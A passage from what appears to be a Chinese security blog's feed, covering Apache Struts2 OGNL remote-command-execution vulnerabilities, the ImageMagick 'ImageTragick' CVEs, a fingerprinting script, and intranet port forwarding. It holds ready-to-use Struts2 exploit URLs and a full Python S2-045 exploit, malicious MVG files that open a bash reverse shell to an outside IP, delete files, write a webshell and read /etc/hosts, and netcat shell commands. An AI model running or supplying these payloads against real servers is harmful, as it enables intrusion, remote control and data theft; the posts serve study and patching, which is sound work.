反射机制去间&gt;接修改：<br>    <code>#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true)</code></p></blockquote><p>Poc:</p><pre><code>http://localhost:8080/S2-015/${%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23f=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())}.action</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-015.png" alt=""></p><h3 id="s2-16"><a href="#s2-16" class="headerlink" title="s2-16"></a>s2-16</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-016.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-016.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.3.15</p><p>修复摘要：删除 “action:”，”redirect:”，”redirectAction:” 这些前置前缀调用<br>DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction:<br>作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意<br>OGNL 表达式，从而导致任意命令执行，经测试发现 redirect: 和 redirectAction:<br>这两个前缀比较好容易构造出命令执行的 Payload（转义后）</p></blockquote><p>Poc:</p><pre><code>http://localhost:8080/S2-016/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%7D</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-016.png" alt=""></p><h3 id="s2-019"><a href="#s2-019" class="headerlink" title="s2-019"></a>s2-019</h3><blockquote><p>官方链接：<a href="http://struts.apache.org/docs/s2-019.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-019.html</a></p><p>影响版本:Struts 2.0.0 - Struts 2.3.15.1</p><p>因为开启了开发者模式，传入debug=command&amp;expression=导致执行OGNL表达式，从而造成命令执行漏洞。</p></blockquote><p>Poc:<br>获取web目录:</p><pre><code>http://localhost:8080/S2-019/example/HelloWorld.action?debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-019.png" alt=""></p><h3 id="s2-029"><a href="#s2-029" class="headerlink" title="s2-029"></a>s2-029</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-029.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-029.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.3.16</p><p>修复摘要：限制传入标签属性的值，对其进行合规的正则验证 简单的说就是当开发者在模版中使用了类似如下的标签写法时，后端 Struts2<br>处理时会导致二次 OGNL 表达式执行的情况：</p><p>&lt;s:textfield name=”%{message}”&gt;</s:textfield> 这里需要注意的是，仅当只有 name<br>属性这样写的情况下才能触发 OGNL 表达式执行，并且该标签中不能显示写有 value<br>属性。详细分析可参考天融信阿尔法实验室的张萌所写的<a href="http://blog.topsec.com.cn/ad_lab/struts2%E6%BC%8F%E6%B4%9Es2-029%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">《struts2漏洞s2-029分析》</a></p><p>到 S2-029 这里是，Struts2 已经增加了相当多的安全检测了，所以想要直接执行命令还需要通<br>过修改这些安全参数来绕过最后的执行检测，具体的安全参数版本差异同样可参考上面的详细分析文章。</p></blockquote><p>Poc:</p><pre><code>http://localhost:8080/S2-029/default.action?message=(%23_memberAccess[&apos;allowPrivateAccess&apos;]=true,%23_memberAccess[&apos;allowProtectedAccess&apos;]=true,%23_memberAccess[&apos;excludedPackageNamePatterns&apos;]=%23_memberAccess[&apos;acceptProperties&apos;],%23_memberAccess[&apos;excludedClasses&apos;]=%23_memberAccess[&apos;acceptProperties&apos;],%23_memberAccess[&apos;allowPackageProtectedAccess&apos;]=true,%23_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream()))</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-029.png" alt=""></p><h3 id="s2-032"><a href="#s2-032" class="headerlink" title="s2-032"></a>s2-032</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-032.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-032.html</a></p><p>影响版本：Struts 2.3.20 - Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p><p>修复摘要：过滤通过 method: 传入的 action 名称，限制其字符范围 protected Pattern<br>allowedActionNames = Pattern.compile(“[a-zA-Z0-9._!/-]*”); 在配置了<br>Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public<br>的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI<br>的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL<br>计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》</p><p>要成功利用必须要开 DMI 才可以：</p><constant name="struts.enable.DynamicMethodInvocation" value="true" />找到目标应用有效的 Action 例如 index.action，那么直接使用 DMI 在 method: 后面带上需要执行 OGNL表达式即可（注意转义)</blockquote><p>Poc:<br>获取web目录：</p><pre><code>http://localhost:8080/S2-032/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=UTF-8&amp;web=web&amp;path=path%3a</code></pre><p>命令执行：</p><pre><code>http://localhost:8080/S2-032/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=whoami</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-032.png" alt=""></p><h3 id="s2-devMode"><a href="#s2-devMode" class="headerlink" title="s2-devMode"></a>s2-devMode</h3><p>影响：Struts 2.1.0–2.5.1</p><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p><p>Poc:</p><pre><code>http://localhost:8080/S2-devMode/orders/3/?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=netstat -ano</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-devmode.png" alt=""></p><h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><p>官方链接：<a href="http://struts.apache.org/docs/s2-045.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-045.html</a></p><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><p>通过Content-Type这个header头，注入OGNL语言，进而执行命令。</p><p>Poc：</p><pre><code>#!/usr/bin/python# -*- coding: utf-8 -*-import urllib2import httplibdef exploit(url, cmd):    payload = &quot;%{(#_=&apos;multipart/form-data&apos;).&quot;    payload += &quot;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot;    payload += &quot;(#_memberAccess?&quot;    payload += &quot;(#_memberAccess=#dm):&quot;    payload += &quot;((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).&quot;    payload += &quot;(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot;    payload += &quot;(#ognlUtil.getExcludedPackageNames().clear()).&quot;    payload += &quot;(#ognlUtil.getExcludedClasses().clear()).&quot;    payload += &quot;(#context.setMemberAccess(#dm)))).&quot;    payload += &quot;(#cmd=&apos;%s&apos;).&quot; % cmd    payload += &quot;(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).&quot;    payload += &quot;(#cmds=(#iswin?{&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd}:{&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd})).&quot;    payload += &quot;(#p=new java.lang.ProcessBuilder(#cmds)).&quot;    payload += &quot;(#p.redirectErrorStream(true)).(#process=#p.start()).&quot;    payload += &quot;(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot;    payload += &quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot;    payload += &quot;(#ros.flush())}&quot;    try:        headers = {&apos;User-Agent&apos;: &apos;Mozilla/5.0&apos;, &apos;Content-Type&apos;: payload}        request = urllib2.Request(url, headers=headers)        page = urllib2.urlopen(request).read()    except httplib.IncompleteRead, e:        page = e.partial    print(page)    return pageif __name__ == &apos;__main__&apos;:    import sys    if len(sys.argv) != 3:        print(&quot;[*] struts2_S2-045.py &lt;url&gt; &lt;cmd&gt;&quot;)    else:        print(&apos;[*] CVE: 2017-5638 - Apache Struts2 S2-045&apos;)        url = sys.argv[1]        cmd = sys.argv[2]        print(&quot;[*] cmd: %s\n&quot; % cmd)        exploit(url, cmd)</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-045.png" alt=""></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">Struts2 历史 RCE 漏洞回顾不完全系列</a></li><li><a href="http://blog.0kami.cn/2017/01/13/Struts2-history-payload/" target="_blank" rel="noopener">Struts2命令执行集合</a></li><li><a href="https://github.com/phith0n/vulhub/tree/master/struts2" target="_blank" rel="noopener">vulhub</a></li><li><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">VulApps</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直都想分析下Struts2命令执行系列的的漏洞，但是能力有限，对java、Struts2都不熟悉。后来偶然看到rickgray的&lt;a href=&quot;http://rickgray.me/2016/05/06/review-struts2-remote-command-exe
      
    
    </summary>
    
    
      <category term="vul-analysis" scheme="http://zerokeeper.github.io/categories/vul-analysis/"/>
    
    
      <category term="命令执行" scheme="http://zerokeeper.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="struts2" scheme="http://zerokeeper.github.io/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>ImageMagick-CVE-2016-3714 命令执行分析</title>
    <link href="http://zerokeeper.github.io/vul-analysis/ImageMagick-CVE-2016-3714.html"/>
    <id>http://zerokeeper.github.io/vul-analysis/ImageMagick-CVE-2016-3714.html</id>
    <published>2017-06-02T03:38:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="关于ImageMagick"><a href="#关于ImageMagick" class="headerlink" title="关于ImageMagick"></a>关于ImageMagick</h3><p>ImageMagick是一个功能强大的开源图形处理软件,可以用来读、写和处理超过90种的图片文件,包括流行的JPEG、GIF、 PNG、PDF以及PhotoCD等格式。使用它可以对图片进行切割、旋转、组合等多种特效的处理。由于其功能强大、性能较好,并且对很多语言都有拓展支持,所以在程序开发中被广泛使用。许多网站开发者喜爱使用ImageMagick拓展来做web上的图片处理工作,比如用户头像生成、图片编辑等。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/imagemagick.png" alt=""></p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>ImageMagick是一款开源图片处理库，支持PHP、Ruby、NodeJS和Python等多种语言，使用非常广泛。包括PHP imagick、Ruby rmagick和paperclip以及NodeJS imagemagick等多个图片处理插件都依赖它运行。当攻击者构造含有恶意代码得图片时，ImageMagick库对于HTTPPS文件处理不当，没有做任何过滤，可远程实现远程命令执行，进而可能控制服务器。<br>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。国外的安全人员为此新建的一个网站： <a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a></p><p>影响范围：ImageMagick 6.9.3-9以前的所有版本</p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>命令执行漏洞是出在ImageMagick对https形式的文件处理的过程中。</p><p>ImageMagick之所以支持那么多的文件格式,是因为它内置了非常多的图像处理库,对于这些图像处理库,ImageMagick给它起了个名字叫做”Delegate”(委托),每个Delegate对应一种格式的文件,然后通过系统的system()命令来调用外部的lib进行处理。调用外部lib的过程是使用系统的system命令来执行的，导致命令执行的代码。</p><p>ImageMagick委托的默认配置文件： /etc/ImageMagick/delegates.xml<br>参考代码：<a href="https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c#L98" target="_blank" rel="noopener">配置</a><br>定位到https委托得那一行</p><pre><code>&quot;  &lt;delegate decode=\&quot;https\&quot; command=\&quot;&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\&quot;/&gt;&quot;</code></pre><p>command定义了它对于https文件处理时带入system()函数得命令：”wget” -q -O “%o” “https:%M”<br>wget是从网络下载文件得命令，%M是一个占位符，它得具体定义在配置文件中如下：</p><pre><code>%i  input image filename%o  output image filename%u  unique temporary filename%Z  unique temporary filename%#  input image signature%b  image file size%c  input image comment%g  image geometry%h  image rows (height)%k  input image number colors%l  image label%m  input image format%p  page number%q  input image depth%s  scene number%w  image columns (width)%x  input image x resolution%y  input image y resolution</code></pre><p>%m被定义为输入的图片格式,也就是输入的url地址。但是由于只是做了简单的字符串拼接,没有做任何过滤，直接拼接到command命令中，可以将引号闭合后通过”|”,”`”,”&amp;”等带入其他命令,也就形成了命令注入。</p><p>比如我们传入如下代码：</p><p><a href="https://example.com&quot;|ls" target="_blank" rel="noopener">https://example.com&quot;|ls</a> “-al<br>则实际得system函数执行得命令为：</p><pre><code>&quot;wget&quot; -q -O &quot;%o&quot; &quot;https://example.com&quot;|ls &quot;-al&quot;</code></pre><p>这样，ls -al命令成功执行。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>测试环境用的是：<a href="https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1" target="_blank" rel="noopener">ImageMagick 命令执行漏洞（CVE-2016–3714）环境</a><br>创建一个test.png的文件，内容如下：</p><pre><code>push graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-al)&apos;pop graphic-context</code></pre><p>这样，ImageMagick在正常执行图片转换、处理的时候就会触发漏洞：<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/imagemagick1.png" alt=""></p><p>push和pop是用于堆栈的操作，一个进栈，一个出栈;<br>viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;<br>fill url()是把图片填充到当前元素内;<br>在其中我们使用了fill url()的形式调用存在漏洞的https delegate,当ImageMagick去处理这个文件时,漏洞就会被触发。</p><p>附：ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，允许在其中加载ImageMagick中其他的delegate(比如存在漏洞的https delegate)。并且在图形处理的过程中,ImageMagick会自动根据其内容进行处理,也就是说我们可以将文件随意定义为png、jpg等网站上传允许的格式,这大大增加了漏洞的可利用场景。</p><p>写了一个图片上传测试页面</p><pre><code>&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;        &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;?php        $filename = $_FILES[&apos;file&apos;][&apos;name&apos;];        $type = substr($filename, strrpos($filename, &apos;.&apos;)+1);        if ($type === &quot;jpg&quot; || $type === &quot;png&quot; || $type === &quot;gif&quot;) {                move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $filename);                $imgObject = new Imagick($filename);        }?&gt;&lt;/html&gt;</code></pre><p>上传nc.png,内容为：</p><pre><code>push graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/1.jpg&quot;|bash -i &gt;&amp; /dev/tcp/45.xxx.xxx.23/2233 0&gt;&amp;1&quot;)&apos;pop graphic-context</code></pre><p>监听反弹shell<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/imagemagick2.png" alt=""></p><p>如果不反弹shell，我们无法得知是否存在漏洞，可以用cloudeye，ceye等工具，查看请求记录。</p><pre><code>push graphic-contextviewbox 0 0 640 480fill &apos;url(http://image.xxxxx.ceye.io)&apos;pop graphic-context</code></pre><h4 id="其他cve漏洞"><a href="#其他cve漏洞" class="headerlink" title="其他cve漏洞"></a>其他cve漏洞</h4><p>CVE-2016-3718，利用mvg格式中可以包含url的特点，进行SSRF攻击</p><pre><code>push graphic-contextviewbox 0 0 640 480fill &apos;url(http://example.com/)&apos;pop graphic-context</code></pre><p>CVE-2016-3715是利用ImageMagick支持的ephemeral协议，来删除任意文件</p><pre><code>push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 &apos;ephemeral:/tmp/delete.txt&apos;pop graphic-context</code></pre><p>CVE-2016-3716是利用ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。</p><p>特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作：</p><pre><code>file_move.mvg-=-=-=-=-=-=-=-=-push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 &apos;msl:/tmp/msl.txt&apos;pop graphic-context/tmp/msl.txt-=-=-=-=-=-=-=-=-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;image&gt;&lt;read filename=&quot;/tmp/image.gif&quot; /&gt;&lt;write filename=&quot;/var/www/shell.php&quot; /&gt;&lt;/image&gt;</code></pre><p>CVE-2016-3717可以造成本地文件读取漏洞：</p><pre><code>push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 &apos;label:@/etc/hosts&apos;pop graphic-context</code></pre><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ol><li>升级到最新版本</li><li>使用policy file来防御这个漏洞，这个文件默认位置在 /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：</li></ol><pre><code>&lt;policymap&gt;&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;&lt;/policymap&gt; </code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">CVE-2016-3714 - ImageMagick 命令执行分析</a></li><li><a href="http://byd.dropsec.xyz/2016/10/02/ImageMagick%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/" target="_blank" rel="noopener">ImageMagick命令执行漏洞浅析</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;关于ImageMagick&quot;&gt;&lt;a href=&quot;#关于ImageMagick&quot; class=&quot;headerlink&quot; title=&quot;关于ImageMagick&quot;&gt;&lt;/a&gt;关于ImageMagick&lt;/h3&gt;&lt;p&gt;ImageMagick是一个功能强大的开源图形处理软
      
    
    </summary>
    
    
      <category term="vul-analysis" scheme="http://zerokeeper.github.io/categories/vul-analysis/"/>
    
    
      <category term="命令执行" scheme="http://zerokeeper.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="imagemagick" scheme="http://zerokeeper.github.io/tags/imagemagick/"/>
    
  </entry>
  
  <entry>
    <title>WebEye</title>
    <link href="http://zerokeeper.github.io/programing/webeye.html"/>
    <id>http://zerokeeper.github.io/programing/webeye.html</id>
    <published>2017-05-09T05:58:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一个快速简单地识别WEB服务器类型、CMS类型、WAF类型以及语言框架的小脚本"><a href="#一个快速简单地识别WEB服务器类型、CMS类型、WAF类型以及语言框架的小脚本" class="headerlink" title="一个快速简单地识别WEB服务器类型、CMS类型、WAF类型以及语言框架的小脚本"></a>一个快速简单地识别WEB服务器类型、CMS类型、WAF类型以及语言框架的小脚本</h3><p>Github地址： <a href="https://github.com/zerokeeper/WebEye" target="_blank" rel="noopener">WebEye</a></p><h3 id="一个快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架的小脚本"><a href="#一个快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架的小脚本" class="headerlink" title="一个快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架的小脚本"></a>一个快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架的小脚本</h3><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>Python 2.7</li><li>pip</li></ul><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><ul><li>gevent</li><li>requests</li><li>pythonwhois</li></ul><p>主要是使用异步实现指纹的快速识别。脚本虽然简单，但是前前后后，指纹的收集制作却花费了我大量时间。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/WebEye.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一个快速简单地识别WEB服务器类型、CMS类型、WAF类型以及语言框架的小脚本&quot;&gt;&lt;a href=&quot;#一个快速简单地识别WEB服务器类型、CMS类型、WAF类型以及语言框架的小脚本&quot; class=&quot;headerlink&quot; title=&quot;一个快速简单地识别WEB服务
      
    
    </summary>
    
    
      <category term="programing" scheme="http://zerokeeper.github.io/categories/programing/"/>
    
    
      <category term="python" scheme="http://zerokeeper.github.io/tags/python/"/>
    
      <category term="gevent" scheme="http://zerokeeper.github.io/tags/gevent/"/>
    
  </entry>
  
  <entry>
    <title>内网端口转发及穿透</title>
    <link href="http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html"/>
    <id>http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html</id>
    <published>2017-04-28T03:46:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-1.jpg" alt=""></p><h3 id="0x01-正向和反向代理"><a href="#0x01-正向和反向代理" class="headerlink" title="0x01 正向和反向代理"></a>0x01 正向和反向代理</h3><p>正向代理中，proxy和client同属一个LAN，对server透明； 反向代理中，proxy和server同属一个LAN，对client透明。 实际上proxy在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。</p><h4 id="正向代理-Forward-Proxy"><a href="#正向代理-Forward-Proxy" class="headerlink" title="正向代理(Forward Proxy)"></a>正向代理(Forward Proxy)</h4><pre><code>Lhost－－》proxy－－》Rhost</code></pre><p>Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。</p><h4 id="反向代理（reverse-proxy）"><a href="#反向代理（reverse-proxy）" class="headerlink" title="反向代理（reverse proxy）"></a>反向代理（reverse proxy）</h4><pre><code>Lhost&lt;---&gt;proxy&lt;---&gt;firewall&lt;---&gt;Rhost</code></pre><p>和正向代理相反（废话），Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透</p><h4 id="简单区分"><a href="#简单区分" class="headerlink" title="简单区分"></a>简单区分</h4><p>正向代理代理的是客户端，反向代理代理的是服务端，正向代理是我们自己(Lhost)戴套(proxy)插进去，反向代理是她(Rhost)主动通过上位(proxy)坐上来(Lhost)。</p><h3 id="0x02-lcx转发"><a href="#0x02-lcx转发" class="headerlink" title="0x02 lcx转发"></a>0x02 lcx转发</h3><p>内网IP：192.168.153.138<br>公网ip：192.168.153.140<br>由于是本地实验，我这里将138的防火墙打开，当作内网环境，140防火墙关闭，充当公网ip，所以正常情况下138能访问140，而140不能直接访问138。这是两台机器互相ping的结果。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-2.png" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-3.png" alt=""></p><p>1.内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口</p><pre><code>lcx.exe –slave 192.168.153.140 4444 192.168.153.138 3389</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-4.png" alt=""></p><p>将内网(192.168.153.138)的3389端口转发到公网(192.168.153.138)的4444端口<br>2.公网(192.168.153.138)执行：lcx -listen 4444 5555</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-5.png" alt=""></p><p>监听公网4444端口请求，并将4444的请求传送给5555端口。<br>此时已经把内网的3389端口转发到了公网的5555端口。可以通过127.0.0.1:5555连接到内网的远程桌面。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-6.png" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-7.png" alt=""></p><h3 id="0x03-nc反弹"><a href="#0x03-nc反弹" class="headerlink" title="0x03 nc反弹"></a>0x03 nc反弹</h3><h4 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h4><p>在内网执行</p><pre><code>nc -l -p 5555 -t -e cmd.exe</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-8.png" alt=""></p><p><code>-t</code>是通过telne模式执行 cmd.exe 程序，可以省略。<br>在公网执行</p><pre><code>nc -nvv 192.168.153.138 5555</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-9.png" alt=""></p><h4 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h4><p>在公网监听<code>nc -lp 5555</code></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-10.png" alt=""></p><p>在内网机器反弹<code>nc -t -e cmd 192.168.153.140 5555</code></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-11.png" alt=""></p><h3 id="0x04-socks代理工具"><a href="#0x04-socks代理工具" class="headerlink" title="0x04 socks代理工具"></a>0x04 